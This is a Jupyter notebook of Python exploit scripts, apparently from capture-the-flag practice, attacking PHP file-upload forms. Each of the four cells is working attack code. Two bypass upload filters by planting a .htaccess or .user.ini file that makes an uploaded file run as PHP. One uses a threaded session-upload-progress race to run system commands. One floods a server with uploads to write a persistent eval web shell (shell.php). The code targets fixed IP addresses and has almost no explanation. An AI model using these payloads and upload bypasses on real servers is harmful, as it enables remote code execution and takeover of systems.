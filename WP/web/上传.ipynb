{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### .htaccess"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "filex = {'upload_file':('a.xxx',b'<?php @eval($_REQUEST[1]);?>' ),\n",
    "         'upload_file':('.htaccess',b'AddType application/x-httpd-php .xxx' )}\n",
    "url='http://10.101.0.5/'\n",
    "requests.post(url,data={'submit':'true'},files=filex).text"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### .user.ini"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "url='http://10.101.0.5/'\n",
    "filex = {'upload_file':('fox.gif',b'<?php @eval($_REQUEST[1]);?>' )}\n",
    "print(requests.post(url,data={'submit':'true'},files=filex).text)\n",
    "filex={'upload_file':('.user.ini',b'auto_prepend_file=fox.gif')}\n",
    "print(requests.post(url,data={'submit':'true'},files=filex).text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Session"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "import io\n",
    "import requests\n",
    "import threading\n",
    "import random \n",
    "url = 'http://124.221.162.61:10001/'\n",
    "signle = random.randint(0, 65535)\n",
    "def write(session):\n",
    "    data = {\n",
    "        'PHP_SESSION_UPLOAD_PROGRESS': f'<?php system(\"ls /\");?>fucker_{signle}'\n",
    "    }\n",
    "    while True:\n",
    "        f = io.BytesIO(b'a' * 1024 * 10)\n",
    "        response = session.post(url,cookies={'PHPSESSID': 'flag'}, data=data, files={'file': ('dotca.txt', f)})\n",
    "def read(session):\n",
    "    while True :\n",
    "        response = session.get(url+'?🤯=/tmp/sess_flag')\n",
    "        if f'fucker_{signle}' in response.text:\n",
    "            print('[+]',response.text)\n",
    "            break\n",
    "\n",
    "session = requests.session()\n",
    "for i in range(30):\n",
    "    threading.Thread(target=write, args=(session,)).start()\n",
    "for i in range(30):\n",
    "    threading.Thread(target=read, args=(session,)).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 竞争上传"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import threading\n",
    "shell=b'''<?PHP fputs(fopen('shell.php','w'),'- - - - - <br><?php @eval($_POST[1])?><br>- - - - -');?>'''\n",
    "def post():\n",
    "    url='http://10.101.0.8/'\n",
    "    filex = {'upload_file':('fox.php',shell )}\n",
    "    for i in range(1000):\n",
    "       requests.post(url,data={'submit':'true'},files=filex)\n",
    "tl = [threading.Thread(target=post) for i in range(10)] \n",
    "for i in tl:\n",
    "    i.demo=True\n",
    "    i.start()\n",
    "for i in tl:\n",
    "    i.join()\n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
